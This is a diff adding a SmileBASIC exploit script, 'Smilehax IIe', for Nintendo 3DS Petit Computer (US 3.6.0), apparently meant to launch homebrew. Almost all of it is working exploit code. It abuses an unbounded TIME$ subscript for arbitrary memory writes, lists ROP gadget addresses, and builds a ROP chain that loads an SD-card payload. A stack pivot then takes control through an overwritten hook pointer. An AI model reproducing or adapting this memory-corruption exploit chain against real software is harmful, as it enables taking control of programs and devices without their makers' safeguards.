@@ -1,0 +1,92 @@
+'Smilehax IIe - zoogie
+'condensed, easier to type versions are in the release archive
+'US 3.6.0 offsets are used here
+
+'''''' POKE
+A=0                            'A needs to be defined before the following function to ensure it's global
+
+DEF P V                        'P for POKE :3 this function patches userland memory DATA/BSS (V is the u32 value to write, global A is where to write)
+X=(A-&H2E4414)>>1           
+TIME$[X+0]=CHR$(V AND &HFFFF)  '(vuln) the subscript for TIME$ isn't bounds checked, so we can write to a lot of cool places (PEEKing doesn't work here like the first smilehax, but that's ok :p).
+TIME$[X+1]=CHR$(V>>16)
+A=A+4                          'increment a word every call. can be reset with global A=whatever before the call
+END                            'end P/POKE
+
+'''''' gadgets and more
+POP_PC=&H112140
+POP_R0PC=&H132860  
+POP_R1PC=&H20CAA8
+POP_R2R4PC=&H254C61 'no R3
+POP_R3PC=&H11A7D0
+SPVT=&H20C17C       'stack pivot - ldmdb r0! {sb, sp, lr, pc}
+PATH=&H1A8B06 
+S=&H400000          'hook redirect address
+FILE=&H410000       'file handle
+SIZE=&H10000        'sd payload read size  
+ROP=&H420000        'rop initial payload location
+MOUNT=&H20FB40 
+ARCHIVE=&H1067D5 
+IOPEN=&H203874   
+IREAD=&H20378C
+ROP=&H420000
+
+''''''initial rop payload
+A=ROP        'at 0x420000
+P POP_R0PC
+P ARCHIVE    'o2: in ascii. this is part of ro2: (for EUR this is om:, short for rom:)
+P MOUNT      'sd mount function
+P 0
+P 0
+P 0
+P POP_R0PC
+P FILE
+P POP_R1PC
+P PATH       'o2:/petitcom_us.icn in utf-16. using a pre-existing string in memory saves space
+P POP_R2R4PC
+P 1          'open to read
+P 0
+P IOPEN      'sd payload with 3ds_ropkit code is opened
+P 0
+P 0
+P 0
+P 0
+P 0
+P POP_R0PC   'set up args for iread
+P FILE
+P POP_R1PC
+P FILE+32
+P POP_R2R4PC:DEST=A 
+P 0          'DEST=A above records the iread destination arg location - the last 3 lines of this section will set it
+P 0
+P POP_R3PC
+P SIZE
+P IREAD
+P 0
+P 0
+P 0
+P 0
+P 0
+P 0
+ROPKIT=A  'ROPKIT is the location petitcom_us.icn will load into memory (right here)
+A=DEST
+P ROPKIT  'patch the final arg (DEST) of iread to point sd payload (ropkit) to the end of this chain - this is to avoid another stack pivot and save space in the process
+
+''''''crash handling and stack pivot to initial rop payload
+'from codebin disasm - unimportant instructions are ommitted
+'LDR             R0, =dword_315A40
+'LDR             R4, [R0]
+'LDR             R0, [R4]
+'LDR             R1, [R0,#0x10]
+'MOV             R0, R4
+'BLX             R1    (we use a ldmdb r0! SPivot here to get control)
+''''''end codebin asm, the following basic instructions exploit above asm
+A=S-12     '3FFFF4 
+P ROP      '3FFFF4 SP - move stack to initial rop payload below
+P 0        '3FFFF8 LR - don't care
+P POP_PC   '3FFFFC PC - write POPPC gadget to start initial rop payload
+P S        '400000 R0 - make sure stack pivot gadget is loading data into regs from the correct base address 400000
+A=S+16     '400010   
+P SPVT     '400010 R1, [R0,#0x10]  stack pivot gadget to R1 then blx R1
+
+A=&H315A40 'exploit hook pointer - this sets everything in motion - it's done last to avoid a race condition, this pointer is read by the main SB thread at intervals out of our control
+P S        '315A40 R0 - R0, =dword_315A40 - write 400000 to address 315A40
